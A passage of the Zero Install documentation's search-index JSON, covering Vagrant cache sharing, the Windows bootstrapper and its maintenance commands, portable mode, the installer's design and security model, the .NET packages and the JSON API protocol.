convenient but less secure... config.vm.provider :virtualbox do |vb| vb.customize [\"setextradata\", :id, \"VBoxInternal2/SharedFoldersEnableSymlinksCreate/shared-guest-cache\", \"1\"] end config.vm.synced_folder \"/home/me/.cache/shared-vagrant-guest-cache\", \"/home/vagrant/.cache/0install.net/implementations\" end Change the /home/me/.cache/shared-vagrant-guest-cache line to the path where you want to store the shared cache on the host. Ensure you have version 4.2.0 or later of the guest additions installed, or symlinks might not work. Here, the VMs will have read-only access to the host's cache (assuming you've set up sharing on the host), plus read-write access to a cache shared between the guests. Note that a malicious guest can corrupt this cache, and thus affect other VMs using it. However, assuming non-malicious guests, there is no problem sharing the cache between different VM types (e.g. Debian, Fedora, 32-bit, 64-bit, etc).","title":"Vagrant"},{"location":"details/windows/","text":"The Windows version of Zero Install extends the cross-platform core Zero Install .NET with a GUI and various OS-specific integrations. The Linux version and Windows version of Zero Install share the same feed format . For most common use-cases they behave identically on the command-line. There are however some OS-specific differences . Bootstrapper Integration Command-line Maintenance Portable mode Limitations Technical details Bootstrapper When you download Zero Install for Windows from the web-site you get a so called Bootstrapper. This is a stripped down version of Zero Install bundled into a single executable file. It contains just enough functionality to download and run a full version of Zero Install, which is distributed as regular feed: http://0install.de/feeds/ZeroInstall.xml Integration When Zero Install is started by the Bootstrapper it is running from the cache and is not integrated into the system. There are no start menu entries, the command-line tools are not in the PATH , etc.. This is by design; after all you may only need Zero Install once on that particular machine or may decide you don't like it. In that case you can simply delete the Bootstrapper EXE when you're done. If you then decide you wish to keep using Zero Install you can \"Click to setup...\". This applies desktop integration for Zero Install (start menu entry, command-line tools in PATH ). It also installs the Store Service if you choose to setup Zero Install \"For all users\". This is different from the desktop integration Zero Install performs for other applications. For these Zero Install will create little stub executables in the appropriate locations that point to the application's feed. However, for Zero Install itself the entire binaries need to be copied to a permanent location . Otherwise each of these stubs would need to bundle all the functionality of the Bootstrapper in order to locate (or potentially download) Zero Install. Having a specific version of Zero Install copied to a fixed location would seem to undermine many of the advantages of Zero Install, such as background updates of applications and running multiple versions side-by-side. However, Zero Install can still download and run other versions of itself from the cache. When you tell your deployed instance of Zero Install to update itself it does just that: The new version is downloaded and launched from the cache and instructed to deploy itself to the same location as the existing deployment. The old files are securely replaced using the Windows Restart Manager and rollbacks in case of error. Command-line The regular Bootstrapper ( zero-install.exe ) is a GUI application, but there is also a command-line version ( 0install.exe ) available. If you pass command-line arguments to this executable it will first download the full version of 0install and then pass those arguments through. This makes it great for single-use applications or scripting: Invoke-WebRequest https://0install.de/files/0install.exe -OutFile 0install.exe .\\0install.exe run http://example.com/somefeed.xml You can also use the command-line version of the Bootstrapper to integrate Zero install into the desktop environment: .\\0install.exe maintenance deploy Maintenance Zero Install is designed to be mostly maintenance-free (automatic update checks, etc.). You can use the following commands for additional control where needed: Integrate Zero Install for the current user .\\0install.exe maintenance deploy Integrate Zero Install for all users .\\0install.exe maintenance deploy --machine Remove Zero Install from the system 0install maintenance remove Download and install updates for Zero Install itself 0install self-update Download and install updates for integrated applications and remove outdated files 0install update-all --clean Find and merge any duplicate files in the cache 0install store optimise If you wish to run these commands in automated scripts, add the argument --batch to prevent interactive prompts. Portable mode To set up Zero Install on a USB thumb drive: Connect a thumb drive to the computer and make sure there are no files you still need on it. Format the thumb drive with NTFS (FAT32 will not work, see technical details for explanation). Download and run Zero Install for Windows. Select \"Tools\" and \"Portable Creator\" at the bottom of the window. Follow the instructions on screen. You can now use your thumb drive to run Zero Install on any Windows Computer with the .NET Framework 2.0 (which is built-in starting with Vista). Zero Install stores downloaded applications directly on the stick so you can access the same applications everywhere. Please remember to always \"eject\" the thumb drive in Windows before disconnecting it from the computer. Limitations The applications launched by Zero Install are not automatically made portable by this. They still store their settings in the usual locations. Please make sure to move these files to the thumb drive as necessary. Portable versions of Zero Install cannot perform desktop integration (e.g. create start menu entries). Consider using regular Zero Install on multiple computers with Zero Install Sync instead. Technical details FAT/FAT32-formatted drives cannot be used for Zero Install because they do not store file security settings (ACLs). They also only store time with an accuracy of two seconds while Zero Install checks the exact modification time of files. The portable creator creates a file in the destination directory called _portable , which instructs Zero Install to run in portable mode. When this file is detected Zero Install stores all its files in its installation directory instead of the usual system directories .","title":"Zero Install for Windows"},{"location":"details/windows/#bootstrapper","text":"When you download Zero Install for Windows from the web-site you get a so called Bootstrapper. This is a stripped down version of Zero Install bundled into a single executable file. It contains just enough functionality to download and run a full version of Zero Install, which is distributed as regular feed: http://0install.de/feeds/ZeroInstall.xml","title":"Bootstrapper"},{"location":"details/windows/#integration","text":"When Zero Install is started by the Bootstrapper it is running from the cache and is not integrated into the system. There are no start menu entries, the command-line tools are not in the PATH , etc.. This is by design; after all you may only need Zero Install once on that particular machine or may decide you don't like it. In that case you can simply delete the Bootstrapper EXE when you're done. If you then decide you wish to keep using Zero Install you can \"Click to setup...\". This applies desktop integration for Zero Install (start menu entry, command-line tools in PATH ). It also installs the Store Service if you choose to setup Zero Install \"For all users\". This is different from the desktop integration Zero Install performs for other applications. For these Zero Install will create little stub executables in the appropriate locations that point to the application's feed. However, for Zero Install itself the entire binaries need to be copied to a permanent location . Otherwise each of these stubs would need to bundle all the functionality of the Bootstrapper in order to locate (or potentially download) Zero Install. Having a specific version of Zero Install copied to a fixed location would seem to undermine many of the advantages of Zero Install, such as background updates of applications and running multiple versions side-by-side. However, Zero Install can still download and run other versions of itself from the cache. When you tell your deployed instance of Zero Install to update itself it does just that: The new version is downloaded and launched from the cache and instructed to deploy itself to the same location as the existing deployment. The old files are securely replaced using the Windows Restart Manager and rollbacks in case of error.","title":"Integration"},{"location":"details/windows/#command-line","text":"The regular Bootstrapper ( zero-install.exe ) is a GUI application, but there is also a command-line version ( 0install.exe ) available. If you pass command-line arguments to this executable it will first download the full version of 0install and then pass those arguments through. This makes it great for single-use applications or scripting: Invoke-WebRequest https://0install.de/files/0install.exe -OutFile 0install.exe .\\0install.exe run http://example.com/somefeed.xml You can also use the command-line version of the Bootstrapper to integrate Zero install into the desktop environment: .\\0install.exe maintenance deploy","title":"Command-line"},{"location":"details/windows/#maintenance","text":"Zero Install is designed to be mostly maintenance-free (automatic update checks, etc.). You can use the following commands for additional control where needed: Integrate Zero Install for the current user .\\0install.exe maintenance deploy Integrate Zero Install for all users .\\0install.exe maintenance deploy --machine Remove Zero Install from the system 0install maintenance remove Download and install updates for Zero Install itself 0install self-update Download and install updates for integrated applications and remove outdated files 0install update-all --clean Find and merge any duplicate files in the cache 0install store optimise If you wish to run these commands in automated scripts, add the argument --batch to prevent interactive prompts.","title":"Maintenance"},{"location":"details/windows/#portable-mode","text":"To set up Zero Install on a USB thumb drive: Connect a thumb drive to the computer and make sure there are no files you still need on it. Format the thumb drive with NTFS (FAT32 will not work, see technical details for explanation). Download and run Zero Install for Windows. Select \"Tools\" and \"Portable Creator\" at the bottom of the window. Follow the instructions on screen. You can now use your thumb drive to run Zero Install on any Windows Computer with the .NET Framework 2.0 (which is built-in starting with Vista). Zero Install stores downloaded applications directly on the stick so you can access the same applications everywhere. Please remember to always \"eject\" the thumb drive in Windows before disconnecting it from the computer.","title":"Portable mode"},{"location":"details/windows/#limitations","text":"The applications launched by Zero Install are not automatically made portable by this. They still store their settings in the usual locations. Please make sure to move these files to the thumb drive as necessary. Portable versions of Zero Install cannot perform desktop integration (e.g. create start menu entries). Consider using regular Zero Install on multiple computers with Zero Install Sync instead.","title":"Limitations"},{"location":"details/windows/#technical-details","text":"FAT/FAT32-formatted drives cannot be used for Zero Install because they do not store file security settings (ACLs). They also only store time with an accuracy of two seconds while Zero Install checks the exact modification time of files. The portable creator creates a file in the destination directory called _portable , which instructs Zero Install to run in portable mode. When this file is detected Zero Install stores all its files in its installation directory instead of the usual system directories .","title":"Technical details"},{"location":"developers/","text":"This section is for people developing 0install itself, or integrating it into their own systems (for example, if you want to use 0install to manage plugins for your application). If you want to make programs available through 0install, see the Packagers Documentation instead. Using Git How to get the very latest developer versions using Git. Design A more detailed description of the design of Zero Install. Solver A description of the dependency solver in Zero Install. API The 0launch / 0install command-line interface to Zero Install is sufficient for most purposes. However, sometimes you may want to use the Python library interface. This is used by programs such as 0compile and 0publish , and is also a useful reference for people wanting to modify 0install itself. Python API Use 0install's functions in your own Python applications with a native library. .NET API Use 0install's functions in your own .NET applications with a native library. JSON API Use 0install's functions in any language via a JSON-based stdin/stdout API. Using Zero-Install as a Plugin Manager A blog post showing how 0install can be used to manage plugins for your application.","title":"Overview"},{"location":"developers/design/","text":"Zero Install Design Details Requirements Security and sharing The injector's solution Policies Interfaces and Implementations Versions Stability Dependencies Object diagram Zero Install Design Details This page describes the design of Zero Install itself. Note: Zero Install is based on the principle of Dependency Injection , and is sometimes therefore referred to as the injector . Everything 0launch downloads from the net by default goes in ~/.cache/0install.net/ . Every archive it downloads unpacks into its own directory inside this. So, there's one directory for ROX-Filer, and another for ROX-Session, etc. In fact, there's one directory for every version of ROX-Filer, in case you want more than one available. Every directory is uniquely named, so you'll never get conflicts when trying to install two different programs. The injector doesn't store anything else, except a few configuration details (such as whether you want to check for updates automatically), which go in ~/.config/0install.net/ . Installation never causes any mysterious changes with other files, as happens with some other installation systems. The idea is that you don't need to backup ~/.cache , because you can always download the stuff again. For example, if you delete the whole ~/.cache/0install.net/ directory and then click on ROX-Filer, it will just prompt you to download it again. The cache is just to make things faster (and work when offline), but you don't really need to worry about it. You shouldn't modify anything in there. If sharing is enabled, then Zero Install stores downloaded implementations in /var/cache/0install.net/ instead of in ~/.cache/0install.net/ . This allows sharing between users. The use of cryptographic digests (described below) makes this safe; users don't need to trust each other not to put malicious code in the shared cache. Requirements Any user can run any program they want, without it needing to be installed first. Users refer to programs by globally unique names (URLs). So, a user asks to run \"http://gimp.org/gimp\", rather than the rather vague \"The Gimp\". Users can run whatever version of a program they want. Users don't need the root password. Users don't need to trust each other. The system administrator doesn't have to trust the users. Any developer can make software available through the system (without needing the blessing of some distribution first). Security and sharing To clarify the security requirements: the injector is designed to support this situation: There are two users. The system administrator doesn't trust either with root permission. The users don't trust each other. Both users want to run (the same version of) the Gimp. The Gimp must only be downloaded and stored on disk once. Current systems make you choose either: Inefficient (two copies downloaded and installed), or Insecure (second user must trust first user to get and install a good copy). Although this situation obviously occurs in schools, libraries, etc, solving it is also useful in the home. Although you might expect family members to trust each other, remember that trust includes trusting them not to get infected with viruses, etc. If my brother gets some spyware and then installs the Gimp, I shouldn't get infected too. This also applies if you're doing sandboxing within a single user account, or using a dedicated 'sandbox' user for some tasks. The injector's solution First, users need some way to specify what they want to run exactly. \"Run the Gimp\" is too vague (good gimp or evil gimp?), so we use URLs. If both users say \"Run gimp.org/gimp\" then the system is smart enough to only get it once. If one user says \"Run evil.com/gimp\" and one says \"Run gimp.org/gimp\", the system downloads both programs. Clearly, something has to actually download the software. It can either be one of the users, or a system daemon. The original Zero Install used a system daemon running as its own user, but the current (\"injector\") Zero Install has one of the users download the software. This is nicer, because they can do things like use a mirror or a CD to get the archives. The user uses a setuid (to zeroinstall ) program to copy the downloaded (unpacked) directory into the shared cache in a location derived from a secure hash of its contents. See the Sharing page for details. Policies A running process is created by combining many different libraries (and other components). In the Zero Install world, we have all versions of each library available at all times. The problem then is how to choose which versions to use. Some examples of ways to choose: The very latest version. The latest version in the cache (eg, when off-line). The latest stable version. The version recommended by your distribution. A version not affected by a known security flaw. The version you've always used in the past. A development version you are working on yourself. One way to organise things is to have a component link directly to particular versions of the components on which it depends. So, running Memo 2.0.0 might always use pygtk-2.0.0 and Python 2.2.0. But we often want to use the same component with different versions of its dependencies. For example, when Python 2.2.1 comes out with bug-fixes, we will want Memo to use it automatically. The injector solves this problem by selecting components to meet a program's requirements, according to rules specified by the user: Zero Install uses a SAT solver with conflict-driven learning to find the optimal solution quickly. See The 0install SAT Solver for details. Interfaces and Implementations An interface describes what something does (eg, \"Simple text editor\"). An implementation is something that does it (eg, Edit-1.9.6 or Edit-1.9.7). A feed file is a list of implementations of an interface. In Zero Install, interfaces are named by globally unique URIs (like web pages). Some examples of interfaces are: http://rox.sourceforge.net/2005/interfaces/Edit http://rox.sourceforge.net/2005/interfaces/ROX-Lib Each implementation of an interface is identified by a cryptographic digest, eg: sha1=235cb9dd77ef78ef2a79abe98f1fcc404bba4889 sha1=c86d09f1113041f5eaaa8c3d1416fcf4dad8e2e0 When we run a program (like Edit) we need to choose an implementation of every interface on which it depends. Then, we need to tell the program where to find them all; this process is known as Dependency Injection (or Inversion of Control ). Both tasks are handled by the injector. This takes as input an interface and chooses an implementation based on the policy. By default, the list of implementations of an interface is found by using the interface's name as a URL and downloading the XML feed file it names (click on one of the interfaces above to see what a feed file looks like). Additional feeds (local or remote) can be added manually by the user. Versions An implementation (in the Zero Install sense) is always some particular version. We identify implementations with a cryptographic hash of their contents. Therefore, two releases with the same version number are still considered as separate implementations if they differ in any way. A version is a sequence of dot-separated lists of integers, each followed by an optional modifier. e.g. \"1.2.3-pre4\". It can be just a single number (\"1\") or a sequence of any number of components (\"1.4-rc3.4-post\"). The modifiers are \"-pre\", \"-rc\", \"-\" and \"-post\". Versions are ordered like this: 1 1.1-pre7 1.1-rc3 1.1 1.1-1 1.1-post 1.1.1 1.2 1.2.1 1.2.1.4 1.2.2 3 The injector doesn't care about anything other than the sort order (i.e., whether one version comes before or after another). This is a little different to some other systems, where numbers in different places have different meanings. Incompatible changes (where a newer version cannot be used in place of an older version) to an interface should be handled by creating a new interface. Eg: http://gtk.org/gtk-1.2.xml (contains 1.2.0, 1.2.1, 1.2.2, ...) http://gtk.org/gtk-2.0.xml (contains 2.0.0, 2.0.1, 2.2.0, 2.4.0, 2.4.1, ...) Stability The feed file should also give a stability rating for each implementation. The following levels are allowed: Stable Testing Developer Buggy Insecure Stability ratings are kept independently of the implementations, and are expected to change over time. When any new release is made, its stability should be set to Testing . Users who have selected Help test new versions will then start using it. Other users will continue with the previous stable release. After a while (days, weeks or months, depending on the project) with no serious problems found, the implementation's stability can be changed to Stable so that everyone will use it. If problems are found, it can instead be marked as Buggy , or Insecure . The injector won't select either by default, but it is useful to users to see the reason (users may opt to continue using a buggy version if it seems to work for them, but they should never use an insecure one). Developer is like a more extreme version of Testing , where the program is expected to have bugs. You can use the Preferred Stability setting in the interface dialog to choose which versions to use. You can also change the stability rating of any implementation by clicking on it and choosing a new rating from the popup menu. User-set ratings are shown in capitals. As you make changes to the policy and ratings, the order of the implementations in the list will change. The version at the top is the one that the injector will actually use. In addition to the ratings about, you can set the rating to Preferred . Such versions always come first, unless they're not cached and you are in Off-line mode. Note: If you want to use the second item on the list because the first is buggy, for example, then it is better to mark the first version as buggy than to mark the second as preferred. This is because when a new version is available, you will want that to become the version at the top of the list, whereas a preferred version will always be first. Dependencies The feed file also lists the dependencies of each implementation; the injector locates an implementation of each dependency, recursively. All information about dependencies is handled at the interface level; this is because the same implementation may be used in different ways. Also, for software not specially designed for use with the injector, it allows us to keep the implementation in its original form. This diagram shows some dependencies for Memo (the dotted lines): The injector will also examine the dependencies of ROX-Lib and Python recursively. Object diagram This diagram shows some of the main objects in the Zero Install software:","title":"Design"},{"location":"developers/design/#zero-install-design-details","text":"This page describes the design of Zero Install itself. Note: Zero Install is based on the principle of Dependency Injection , and is sometimes therefore referred to as the injector . Everything 0launch downloads from the net by default goes in ~/.cache/0install.net/ . Every archive it downloads unpacks into its own directory inside this. So, there's one directory for ROX-Filer, and another for ROX-Session, etc. In fact, there's one directory for every version of ROX-Filer, in case you want more than one available. Every directory is uniquely named, so you'll never get conflicts when trying to install two different programs. The injector doesn't store anything else, except a few configuration details (such as whether you want to check for updates automatically), which go in ~/.config/0install.net/ . Installation never causes any mysterious changes with other files, as happens with some other installation systems. The idea is that you don't need to backup ~/.cache , because you can always download the stuff again. For example, if you delete the whole ~/.cache/0install.net/ directory and then click on ROX-Filer, it will just prompt you to download it again. The cache is just to make things faster (and work when offline), but you don't really need to worry about it. You shouldn't modify anything in there. If sharing is enabled, then Zero Install stores downloaded implementations in /var/cache/0install.net/ instead of in ~/.cache/0install.net/ . This allows sharing between users. The use of cryptographic digests (described below) makes this safe; users don't need to trust each other not to put malicious code in the shared cache.","title":"Zero Install Design Details"},{"location":"developers/design/#requirements","text":"Any user can run any program they want, without it needing to be installed first. Users refer to programs by globally unique names (URLs). So, a user asks to run \"http://gimp.org/gimp\", rather than the rather vague \"The Gimp\". Users can run whatever version of a program they want. Users don't need the root password. Users don't need to trust each other. The system administrator doesn't have to trust the users. Any developer can make software available through the system (without needing the blessing of some distribution first).","title":"Requirements"},{"location":"developers/design/#security-and-sharing","text":"To clarify the security requirements: the injector is designed to support this situation: There are two users. The system administrator doesn't trust either with root permission. The users don't trust each other. Both users want to run (the same version of) the Gimp. The Gimp must only be downloaded and stored on disk once. Current systems make you choose either: Inefficient (two copies downloaded and installed), or Insecure (second user must trust first user to get and install a good copy). Although this situation obviously occurs in schools, libraries, etc, solving it is also useful in the home. Although you might expect family members to trust each other, remember that trust includes trusting them not to get infected with viruses, etc. If my brother gets some spyware and then installs the Gimp, I shouldn't get infected too. This also applies if you're doing sandboxing within a single user account, or using a dedicated 'sandbox' user for some tasks.","title":"Security and sharing"},{"location":"developers/design/#the-injectors-solution","text":"First, users need some way to specify what they want to run exactly. \"Run the Gimp\" is too vague (good gimp or evil gimp?), so we use URLs. If both users say \"Run gimp.org/gimp\" then the system is smart enough to only get it once. If one user says \"Run evil.com/gimp\" and one says \"Run gimp.org/gimp\", the system downloads both programs. Clearly, something has to actually download the software. It can either be one of the users, or a system daemon. The original Zero Install used a system daemon running as its own user, but the current (\"injector\") Zero Install has one of the users download the software. This is nicer, because they can do things like use a mirror or a CD to get the archives. The user uses a setuid (to zeroinstall ) program to copy the downloaded (unpacked) directory into the shared cache in a location derived from a secure hash of its contents. See the Sharing page for details.","title":"The injector's solution"},{"location":"developers/design/#policies","text":"A running process is created by combining many different libraries (and other components). In the Zero Install world, we have all versions of each library available at all times. The problem then is how to choose which versions to use. Some examples of ways to choose: The very latest version. The latest version in the cache (eg, when off-line). The latest stable version. The version recommended by your distribution. A version not affected by a known security flaw. The version you've always used in the past. A development version you are working on yourself. One way to organise things is to have a component link directly to particular versions of the components on which it depends. So, running Memo 2.0.0 might always use pygtk-2.0.0 and Python 2.2.0. But we often want to use the same component with different versions of its dependencies. For example, when Python 2.2.1 comes out with bug-fixes, we will want Memo to use it automatically. The injector solves this problem by selecting components to meet a program's requirements, according to rules specified by the user: Zero Install uses a SAT solver with conflict-driven learning to find the optimal solution quickly. See The 0install SAT Solver for details.","title":"Policies"},{"location":"developers/design/#interfaces-and-implementations","text":"An interface describes what something does (eg, \"Simple text editor\"). An implementation is something that does it (eg, Edit-1.9.6 or Edit-1.9.7). A feed file is a list of implementations of an interface. In Zero Install, interfaces are named by globally unique URIs (like web pages). Some examples of interfaces are: http://rox.sourceforge.net/2005/interfaces/Edit http://rox.sourceforge.net/2005/interfaces/ROX-Lib Each implementation of an interface is identified by a cryptographic digest, eg: sha1=235cb9dd77ef78ef2a79abe98f1fcc404bba4889 sha1=c86d09f1113041f5eaaa8c3d1416fcf4dad8e2e0 When we run a program (like Edit) we need to choose an implementation of every interface on which it depends. Then, we need to tell the program where to find them all; this process is known as Dependency Injection (or Inversion of Control ). Both tasks are handled by the injector. This takes as input an interface and chooses an implementation based on the policy. By default, the list of implementations of an interface is found by using the interface's name as a URL and downloading the XML feed file it names (click on one of the interfaces above to see what a feed file looks like). Additional feeds (local or remote) can be added manually by the user.","title":"Interfaces and Implementations"},{"location":"developers/design/#versions","text":"An implementation (in the Zero Install sense) is always some particular version. We identify implementations with a cryptographic hash of their contents. Therefore, two releases with the same version number are still considered as separate implementations if they differ in any way. A version is a sequence of dot-separated lists of integers, each followed by an optional modifier. e.g. \"1.2.3-pre4\". It can be just a single number (\"1\") or a sequence of any number of components (\"1.4-rc3.4-post\"). The modifiers are \"-pre\", \"-rc\", \"-\" and \"-post\". Versions are ordered like this: 1 1.1-pre7 1.1-rc3 1.1 1.1-1 1.1-post 1.1.1 1.2 1.2.1 1.2.1.4 1.2.2 3 The injector doesn't care about anything other than the sort order (i.e., whether one version comes before or after another). This is a little different to some other systems, where numbers in different places have different meanings. Incompatible changes (where a newer version cannot be used in place of an older version) to an interface should be handled by creating a new interface. Eg: http://gtk.org/gtk-1.2.xml (contains 1.2.0, 1.2.1, 1.2.2, ...) http://gtk.org/gtk-2.0.xml (contains 2.0.0, 2.0.1, 2.2.0, 2.4.0, 2.4.1, ...)","title":"Versions"},{"location":"developers/design/#stability","text":"The feed file should also give a stability rating for each implementation. The following levels are allowed: Stable Testing Developer Buggy Insecure Stability ratings are kept independently of the implementations, and are expected to change over time. When any new release is made, its stability should be set to Testing . Users who have selected Help test new versions will then start using it. Other users will continue with the previous stable release. After a while (days, weeks or months, depending on the project) with no serious problems found, the implementation's stability can be changed to Stable so that everyone will use it. If problems are found, it can instead be marked as Buggy , or Insecure . The injector won't select either by default, but it is useful to users to see the reason (users may opt to continue using a buggy version if it seems to work for them, but they should never use an insecure one). Developer is like a more extreme version of Testing , where the program is expected to have bugs. You can use the Preferred Stability setting in the interface dialog to choose which versions to use. You can also change the stability rating of any implementation by clicking on it and choosing a new rating from the popup menu. User-set ratings are shown in capitals. As you make changes to the policy and ratings, the order of the implementations in the list will change. The version at the top is the one that the injector will actually use. In addition to the ratings about, you can set the rating to Preferred . Such versions always come first, unless they're not cached and you are in Off-line mode. Note: If you want to use the second item on the list because the first is buggy, for example, then it is better to mark the first version as buggy than to mark the second as preferred. This is because when a new version is available, you will want that to become the version at the top of the list, whereas a preferred version will always be first.","title":"Stability"},{"location":"developers/design/#dependencies","text":"The feed file also lists the dependencies of each implementation; the injector locates an implementation of each dependency, recursively. All information about dependencies is handled at the interface level; this is because the same implementation may be used in different ways. Also, for software not specially designed for use with the injector, it allows us to keep the implementation in its original form. This diagram shows some dependencies for Memo (the dotted lines): The injector will also examine the dependencies of ROX-Lib and Python recursively.","title":"Dependencies"},{"location":"developers/design/#object-diagram","text":"This diagram shows some of the main objects in the Zero Install software:","title":"Object diagram"},{"location":"developers/dotnet-api/","text":"The Zero Install .NET API implements the core features of Zero Install. Zero Install for Windows is built upon this API. It also allow developers to embed Zero Install functionality in their own applications. Links NuGet packages Documentation and samples Links Zero Install .NET GitHub repository Zero Install for Windows GitHub repository Zero Install Transifex project page NuGet packages You can use the following NuGet packages to integrate Zero Install features into your own application: ZeroInstall.Store Data model for the feed format , signature verification, management of on-disk caches . This provides a common basis for the packages ZeroInstall.Services and ZeroInstall.Publish . You will usually get this package indirectly as a dependency from there. ZeroInstall.Services Core services like solving dependencies , downloading implementations and execution selections. Zero Install itself is built upon this API. You can use the API to integrate Zero Install features into your own application, e.g. for a plugin management system. ZeroInstall.Services.Interfaces Interfaces/abstractions for Zero Install services (contains no actual implementations). You will usually get this package indirectly as a dependency of ZeroInstall.Services . ZeroInstall.DesktopIntegration Methods for integrating applications with desktop environments (creating menu entries, etc.). ZeroInstall.Commands Command-line interface for Zero Install. The binary in this package serves both as an actual CLI and a library for building other clients. ZeroInstall.Publish Utilities for creating and modifying feed files. The Zero Install Publishing Tools (including the Feed Editor) are built upon this library. You can use this to automate complex feed creation/update tasks. The following graph shows the dependencies between the NuGet packages: Documentation and samples See the API documentation for information how to use the Zero Install .NET API. You can also take a look at minimal sample projects in various languages: C# sample Visual Basic .NET sample F# sample IronPython sample","title":".NET API"},{"location":"developers/dotnet-api/#links","text":"Zero Install .NET GitHub repository Zero Install for Windows GitHub repository Zero Install Transifex project page","title":"Links"},{"location":"developers/dotnet-api/#nuget-packages","text":"You can use the following NuGet packages to integrate Zero Install features into your own application: ZeroInstall.Store Data model for the feed format , signature verification, management of on-disk caches . This provides a common basis for the packages ZeroInstall.Services and ZeroInstall.Publish . You will usually get this package indirectly as a dependency from there. ZeroInstall.Services Core services like solving dependencies , downloading implementations and execution selections. Zero Install itself is built upon this API. You can use the API to integrate Zero Install features into your own application, e.g. for a plugin management system. ZeroInstall.Services.Interfaces Interfaces/abstractions for Zero Install services (contains no actual implementations). You will usually get this package indirectly as a dependency of ZeroInstall.Services . ZeroInstall.DesktopIntegration Methods for integrating applications with desktop environments (creating menu entries, etc.). ZeroInstall.Commands Command-line interface for Zero Install. The binary in this package serves both as an actual CLI and a library for building other clients. ZeroInstall.Publish Utilities for creating and modifying feed files. The Zero Install Publishing Tools (including the Feed Editor) are built upon this library. You can use this to automate complex feed creation/update tasks. The following graph shows the dependencies between the NuGet packages:","title":"NuGet packages"},{"location":"developers/dotnet-api/#documentation-and-samples","text":"See the API documentation for information how to use the Zero Install .NET API. You can also take a look at minimal sample projects in various languages: C# sample Visual Basic .NET sample F# sample IronPython sample","title":"Documentation and samples"},{"location":"developers/json-api/","text":"Starting with 0install 2.6, you can connect your programs to 0install via a JSON API. This is useful for writing 0install-based tools in other languages. Introduction Callbacks Operations Sample code Backwards compatibility Introduction To use the JSON API, run 0install slave API-VERSION (where API-VERSION is the latest protocol version you support), like this: $ 0install slave 2.7 0x00000031 [\"invoke\",null,\"set-api-version\",[\"2.6.2-post\"]] 0install responds first with a line indicating the length in octets of the JSON message to follow. All length headers sent by 0install are 11 octets long, including the leading \"0x\" and the trailing newline. After this comes the JSON message, giving the API version it will use. This will be the version you specified or the latest version it supports, whichever is smaller. To invoke an operation, send the message [\"invoke\", myref, op, args] , where myref is any string you choose, which will be attached to the reply, op is the operation to invoke and args are the arguments. Each message must start with a line giving the length in octets of the following message. For example, to ask 0install to select a set of components to run GnuPG: 0x5d [\"invoke\", \"1\", \"select\", [{\"interface\": \"http://repo.roscidus.com/security/gnupg\"}, false]] All responses have the form [\"return\", myref, status, return-value] , where myref lets you correlate this reply with the request you sent. The possible responses are [\"ok\", return-value] , [\"ok+xml\", return-value] and [\"fail\", error-message] . In the case of ok+xml , the message is immediately followed by another length line and some XML. The above request might generate this response, which says to use the distribution's native version of GnuPG (2.0.22-2): 0x0000002f [\"return\",\"1\",\"ok+xml\",[\"ok\",{\"stale\":false}]] 0x000001f5 <?xml version=\"1.0\" encoding=\"UTF-8\"?> <selections interface=\"http://repo.roscidus.com/security/gnupg\" xmlns=\"http://zero-install.sourceforge.net/2004/injector/interface\"><selection distributions=\"Arch Slack Debian RPM Gentoo Cygwin\" from-feed=\"distribution:http://repo.roscidus.com/security/gnupg\" id=\"package:arch:gnupg:2.0.22-2:x86_64\" interface=\"http://repo.roscidus.com/security/gnupg\" package=\"gnupg\" quick-test-file=\"/var/lib/pacman/local/gnupg-2.0.22-2/desc\" version=\"2.0.22-2\"/></selections> Callbacks In the process of handling your request, 0install may send its own invoke messages to you. You should be prepared to handle these messages: set-api-version(version) This is sent immediately at the start, indicating the protocol version to be used. The \"myref\" field is \"null\", indicating that no reply is expected. The version may be earlier than the version you requested, in which case you can either fall back to the earlier version or tell the user to upgrade. confirm(message) If 0install needs to ask the user to confirm something, it sends this message. This is used to confirm installation of distribution-provided packages, if any. Respond with success (\"ok\") and a return value of \"ok\" or \"cancel\". This is currently not used, because \"select\" does not require it. confirm-keys(feed_url, keys) A feed has been downloaded but has no trusted signature. Prompt the user to accept the keys. keys is a list of (fingerprint, hints) pairs, where hints is a list of (vote, message) hints from the key information server. Each vote is \"good\" or \"bad\". You should respond with a list of fingerprints which 0install should trust to sign updates for this domain. 0install will only ask you to confirm one feed at a time. Example: [\"invoke\",\"1\",\"confirm-keys\",[ \"http://repo.roscidus.com/lib/readline6\",{ \"DA9825AECAD089757CDABD8E07133F96CA74D8BA\":[ [\"good\",\"Thomas Leonard created Zero Install and ROX. This key is used to sign updates to the injector; you should accept it. It was announced on the Zero Install mailing list on 2009-05-31.\"]] }]] If the server is slow to respond, you will get a \"pending\" message instead, followed by a call to \"update-key-info\" later: [\"invoke\",\"1\",\"confirm-keys\",[ \"http://repo.roscidus.com/lib/readline6\",{ \"DA9825AECAD089757CDABD8E07133F96CA74D8BA\":[\"pending\"]}]] update-key-info If the key information server is slow to respond, 0install may call confirm-keys before the hints have arrived. It will then send this message when the information arrives (or fails), so you can update the display. Note: the format here is a list of keys rather than a map. Example: [\"invoke\",\"2\",\"update-key-info\", [\"DA9825AECAD089757CDABD8E07133F96CA74D8BA\",[ [\"bad\",\"Error fetching key info: ...\"]]]] If 0install is able to use its own GUI, it will use that rather than these callbacks. Start it with --console if you want to use your own GUI in all cases. Operations Currently, only the select operation is supported (let us know if you want more; they're easy to add): select(requirements, refresh) Return a set of selections to run the given program. If refresh is true , 0install will always try to download a fresh copy of the feeds. Otherwise, it will reply immediately if possible. requirements is a JSON object with these keys (only interface is required): interface The URI of the program to run. command The <command> to run (e.g. run , test , compile or null ). source Whether to select source code (and build dependencies) rather than a binary. extra_restrictions An object mapping interface URIs to version expressions, e.g. {\"http://repo.roscidus.com/python/python\": \"..!3\"} to require a version of Python less than 3. os Select implementations for the given OS (e.g. \"Linux\") cpu Select implementations for the given CPU (e.g. \"x86_64\" or \"src\") message A message to display if 0install uses its own GUI (\"I need this because ...\") may_compile (0install >= 2.9; default false ) Treat source implementations as potential binaries. If a source implementation is selected, it will be tagged with requires-compilation=\"true\" to indicate this. Returns [\"ok\",{\"stale\":stale-flag}] on success. If stale-flag is true, the selections are based on old information. Consider using refresh to check for updates. Sample code There is some sample Python client code available. Backwards compatibility The text above documents the latest version of the protocol. The differences are: 2.6 In this version, select returns \"ok\" without the information about staleness.","title":"JSON API"},{"location":"developers/json-api/#introduction","text":"To use the JSON API, run 0install slave API-VERSION (where API-VERSION is the latest protocol version you support), like this: $ 0install slave 2.7 0x00000031 [\"invoke\",null,\"set-api-version\",[\"2.6.2-post\"]] 0install responds first with a line indicating the length in octets of the JSON message to follow. All length headers sent by 0install are 11 octets long, including the leading \"0x\" and the trailing newline. After 